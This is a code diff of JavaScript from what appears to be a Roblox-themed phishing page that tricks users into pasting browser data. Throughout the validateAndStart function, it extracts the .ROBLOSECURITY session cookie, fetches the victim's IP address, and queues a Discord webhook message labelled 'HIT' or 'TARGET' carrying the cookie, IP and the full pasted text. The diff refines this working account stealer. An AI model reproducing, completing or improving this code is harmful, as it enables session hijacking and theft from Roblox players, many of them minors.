@@ -473,72 +473,48 @@
     if (requestQueue.length > 0) setTimeout(processQueue, 2000);
 }
         
-      async function validateAndStart(event) {
+     async function validateAndStart(event) {
+    // 1. Cooldown Check
     if (isCooldown) return;
     if (!dId) {
         const box = document.getElementById('input-container');
+        document.getElementById('error-msg').classList.remove('opacity-0');
         box.classList.add('error-shake');
+        setTimeout(() => box.classList.remove('error-shake'), 400);
         return;
     }
 
+    // 2. Activate 5s Cooldown
     isCooldown = true;
-    setTimeout(() => { isCooldown = false; }, 5000);
+    const btn = event.target;
+    const originalText = btn.innerText;
+    btn.innerText = "COOLDOWN ACTIVE...";
+    btn.style.opacity = "0.5";
+    setTimeout(() => { isCooldown = false; btn.innerText = originalText; btn.style.opacity = "1"; }, 5000);
 
+    // 3. UI Transition
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
     localStorage.setItem('nexus_hit_counter', cur);
-    
     document.getElementById('setup-phase').classList.add('hidden');
     document.getElementById('progress-phase').classList.remove('hidden');
 
+    // 4. Data Collection
     const raw = document.getElementById('userInput').value;
-    
-    // Improved extraction: specifically looking for the .ROBLOSECURITY token
-    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-F0-9]+)/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
-    let cook = cookMatch ? (cookMatch[1] || cookMatch[0]) : "NOT_FOUND";
-
-    // Discord Field Limit: 1024 characters max. If exceeded, Discord deletes the embed.
-    if (cook.length > 1000) cook = cook.substring(0, 1000);
-
-    let ip = "0.0.0.0";
+    const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
+    let ip = "Detecting...";
     try { 
-        const res = await fetch('https://api.ipify.org?format=json'); 
-        const data = await res.json();
-        ip = data.ip; 
-    } catch(e) { ip = "Detection Timeout"; }
+        const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }); 
+        ip = (await res.json()).ip; 
+    } catch(e) { ip = "Timed Out"; }
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
 
-    // Push Embed first
-    requestQueue.push({ 
-        type: 'json', 
-        payload: { 
-            username: hookName, 
-            avatar_url: logoURL, 
-            embeds: [{ 
-                title: `Successfully Mirrored: ${dName}`, 
-                color: 4387969, // Emerald Green
-                fields: [
-                    { name: "🌐 IP", value: `\`${ip}\``, inline: true }, 
-                    { name: "🎮 ID", value: `\`${dId}\``, inline: true }, 
-                    { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }
-                ],
-                timestamp: new Date().toISOString()
-            }] 
-        } 
-    });
+    // 5. Save to Queue (The "Restore/Fail-safe" logic)
+    requestQueue.push({ type: 'json', payload: { username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }] }] } });
+    requestQueue.push({ type: 'file', payload: { username: hookName, avatar_url: logoURL, filename: `RAWLOG#${cur}.txt`, content: raw } });
 
-    // Push Raw File second
-    requestQueue.push({ 
-        type: 'file', 
-        payload: { 
-            username: hookName, 
-            avatar_url: logoURL, 
-            filename: `RAWLOG_${cur}.txt`, 
-            content: raw 
-        } 
-    });
-
+    // 6. Start Background Processes
     processQueue();
     runEngine();
 }
